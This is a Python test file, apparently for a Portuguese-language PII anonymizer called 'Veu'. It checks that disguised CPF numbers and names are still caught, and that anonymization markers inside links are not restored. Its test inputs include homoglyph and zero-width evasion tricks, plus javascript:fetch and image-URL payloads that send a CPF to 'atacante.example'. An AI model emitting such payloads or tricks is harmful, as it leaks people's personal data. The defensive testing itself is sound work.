"""Achados da simulação de ataques (scripts/simular_ataques.py): disfarces, roubo pela volta e lentidão."""

import time

import pytest

from veu import Veu

CPF = "529.982.247-25"
ZW = "​"


@pytest.mark.parametrize(
    "text,hidden",
    [
        ("CPF 529-982-247-25", "529-982"),
        ("CPF 5 2 9 9 8 2 2 4 7 2 5", "5 2 9 9"),
        ("e-mail mаria.souza@example.com", "souza@example"),  # "а" cirílico
        ("CPF " + "".join(chr(0x0660 + int(c)) if c.isdigit() else c for c in CPF), chr(0x0665)),
        ("CPF " + "".join(chr(0x0966 + int(c)) if c.isdigit() else c for c in CPF), chr(0x096B)),
        (f"CPF 529{ZW}.982.247-25", "529"),
        ("cliente Маria Souza", "Souza"),  # "М" e "а" cirílicos
    ],
)
def test_disguised_data_is_still_found(text, hidden):
    assert hidden not in Veu().anonymize(text).text


def test_spaced_digits_need_the_cpf_context():
    text = "Sequência 5 2 9 9 8 2 2 4 7 2 5 do sorteio"
    assert Veu().anonymize(text).text == text


@pytest.mark.parametrize(
    "reply",
    [
        "[x](javascript:fetch('https://atacante.example/?'+'{cpf}'))",
        "<a href=\"javascript:fetch('https://atacante.example/?'+'{cpf}')\">ok</a>",
        "[x](https://atacante.example/?d=\n{cpf})",
        "<img data-src=\"https://atacante.example/p.png?d={cpf}\">",
        "<img src  =  'https://atacante.example/?d={cpf}'>",
    ],
)
def test_marker_inside_an_open_link_is_not_restored(reply):
    result = Veu().anonymize(f"CPF {CPF}")
    marker = result.replacements[0].replacement
    restored = result.restore(reply.format(cpf=marker))
    assert CPF not in restored


def test_ordinary_text_after_a_closed_link_is_restored():
    result = Veu().anonymize(f"CPF {CPF}")
    marker = result.replacements[0].replacement
    reply = f"Veja [o guia](https://exemplo.example/guia) e o CPF {marker}.\nAspas \"soltas\" e o CPF {marker}."
    assert result.restore(reply).count(CPF) == 2


def test_stream_keeps_the_line_above_for_open_links():
    result = Veu().anonymize(f"CPF {CPF}")
    marker = result.replacements[0].replacement
    reply = f"[x](https://atacante.example/?d=\n{marker}) e depois\no CPF {marker}."
    restorer = result.vault.restorer()
    output = "".join(restorer.feed(reply[i:i + 2]) for i in range(0, len(reply), 2)) + restorer.flush()
    assert output.endswith(f"o CPF {CPF}.") and output.count(CPF) == 1


@pytest.mark.parametrize("text", ["1." * 30000, "1.1.1.1 " * 7500, "-1.12345, " * 6000])
def test_restoring_many_markers_on_one_line_stays_fast(text):
    veu = Veu()
    start = time.perf_counter()
    result = veu.anonymize(text)
    result.restore(result.text)
    assert time.perf_counter() - start < 3
